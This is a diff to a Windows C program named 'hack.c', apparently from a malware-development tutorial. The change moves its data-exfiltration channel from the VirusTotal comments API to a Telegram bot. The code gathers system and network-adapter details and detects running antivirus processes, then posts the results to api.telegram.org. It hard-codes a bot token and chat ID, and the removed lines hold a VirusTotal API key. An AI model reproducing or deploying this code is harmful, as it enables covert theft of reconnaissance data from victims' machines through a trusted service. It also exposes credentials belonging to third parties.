@@ -1,6 +1,6 @@
 /*
- * hack3.c
- * sending systeminfo via legit URL. VirusTotal API
+ * hack.c
+ * sending systeminfo via legit URL. Telegram API
  * author @cocomelonc
 */
 #include <stdio.h>
@@ -10,9 +10,6 @@
 #include <tlhelp32.h>
 #include <winhttp.h>
 #include <iphlpapi.h>
-
-#define VT_API_KEY "7e7778f8c29bc4b171512caa6cc81af63ed96832f53e7e35fb706dd320ab8c42"
-#define FILE_ID "379698a4f06f18cb3ad388145cf62f47a8da22852a08dd19b3ef48aaedffd3fa"
 
 // define a struct to store process name and description
 typedef struct {
@@ -24,8 +21,9 @@ typedef struct {
 Process* process_list;
 int process_count = 0;
 
-// send data to VirusTotal using winhttp
-int sendToVT(const char* comment) {
+// send data to Telegram channel using winhttp
+int sendToTgBot(const char* message) {
+  const char* chatId = "5547299598";
   HINTERNET hSession = NULL;
   HINTERNET hConnect = NULL;
 
@@ -35,13 +33,13 @@ int sendToVT(const char* comment) {
     return 1;
   }
 
-  hConnect = WinHttpConnect(hSession, L"www.virustotal.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
+  hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
   if (hConnect == NULL) {
     fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
     WinHttpCloseHandle(hSession);
   }
 
-  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v3/files/" FILE_ID "/comments", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ/sendMessage", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
   if (hRequest == NULL) {
     fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
     WinHttpCloseHandle(hConnect);
@@ -49,11 +47,11 @@ int sendToVT(const char* comment) {
   }
 
   // construct the request body
-  char json_body[1024];
-  snprintf(json_body, sizeof(json_body), "{\"data\": {\"type\": \"comment\", \"attributes\": {\"text\": \"%s\"}}}", comment);
+  char requestBody[512];
+  sprintf(requestBody, "chat_id=%s&text=%s", chatId, message);
 
   // set the headers
-  if (!WinHttpSendRequest(hRequest, L"x-apikey: " VT_API_KEY "\r\nUser-Agent: vt v.1.0\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/json", -1, (LPVOID)json_body, strlen(json_body), strlen(json_body), 0)) {
+  if (!WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\n", -1, requestBody, strlen(requestBody), strlen(requestBody), 0)) {
     fprintf(stderr, "WinHttpSendRequest. Error %d has occurred.\n", GetLastError());
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
@@ -61,33 +59,11 @@ int sendToVT(const char* comment) {
     return 1;
   }
 
-  BOOL hResponse = WinHttpReceiveResponse(hRequest, NULL);
-  if (!hResponse) {
-    fprintf(stderr, "WinHttpReceiveResponse. Error %d has occurred.\n", GetLastError());
-  }
-
-  DWORD code = 0;
-  DWORD codeS = sizeof(code);
-  if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &code, &codeS, WINHTTP_NO_HEADER_INDEX)) {
-    if (code == 200) {
-      printf("comment posted successfully.\n");
-    } else {
-      printf("failed to post comment. HTTP Status Code: %d\n", code);
-    }
-  } else {
-    DWORD error = GetLastError();
-    LPSTR buffer = NULL;
-    FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
-                   NULL, error, 0, (LPSTR)&buffer, 0, NULL);
-    printf("WTF? unknown error: %s\n", buffer);
-    LocalFree(buffer);
-  }
-
   WinHttpCloseHandle(hConnect);
   WinHttpCloseHandle(hRequest);
   WinHttpCloseHandle(hSession);
 
-  printf("successfully send info via VT API :)\n");
+  printf("successfully sent to tg bot :)\n");
   return 0;
 }
 
@@ -139,27 +115,23 @@ void enumProcs() {
       if (_stricmp(process_list[i].process_name, pe32.szExeFile) == 0) {
         printf("found process: %s - %s \n", process_list[i].process_name, process_list[i].description);
         snprintf(avInfo, sizeof(avInfo),
-        "ProcessName: %s\n"
-        "AVName: %s\n",
+        "ProcessName: %s, "
+        "AVName: %s",
         process_list[i].process_name,
         process_list[i].description);
-        int result = sendToVT(avInfo);
+        char info[8196];
+        // snprintf(info, sizeof(info), "{\"text\":\"%s\"}", avInfo);
+        snprintf(info, sizeof(info), "%s", avInfo);
+        int result = sendToTgBot(info);
+        
         if (result == 0) {
-          printf("AV info ok =^..^=\n");
+            printf("AV info ok =^..^=\n");
         } else {
-          printf("AV info nok <3()~\n");
+            printf("AV info nok <3()~\n");
         }
       }
     }
   } while (Process32Next(hProcessSnap, &pe32));
-
-  // int result = sendToVT(avInfo);
-  
-  // if (result == 0) {
-  //   printf("AV info ok =^..^=\n");
-  // } else {
-  //   printf("AV info nok <3()~\n");
-  // }
 
   CloseHandle(hProcessSnap);
 }
@@ -168,8 +140,11 @@ void enumProcs() {
 int main(int argc, char* argv[]) {
 
   // test posting comment
-//   const char* comment = "meow-meow";
-//   sendToVT(comment);
+  char test[1024];
+  const char* message = "meow-meow";
+//   snprintf(test, sizeof(test), "{\"text\":\"%s\"}", message);
+  snprintf(test, sizeof(test), "%s", message);
+  sendToTgBot(test);
 
   char systemInfo[4096];
 
@@ -224,13 +199,10 @@ int main(int argc, char* argv[]) {
     adapter->Address[3], adapter->Address[4], adapter->Address[5]);
   }
 
-  int result = sendToVT(systemInfo);
-
-  if (result == 0) {
-    printf("ok =^..^=\n");
-  } else {
-    printf("nok <3()~\n");
-  }
+  char info[8196];
+//   snprintf(info, sizeof(info), "{\"text\":\"%s\"}", systemInfo);
+  snprintf(info, sizeof(info), "%s", systemInfo);
+  int result = sendToTgBot(info);
 
   readProcListFromFile("processes.txt");
   enumProcs();
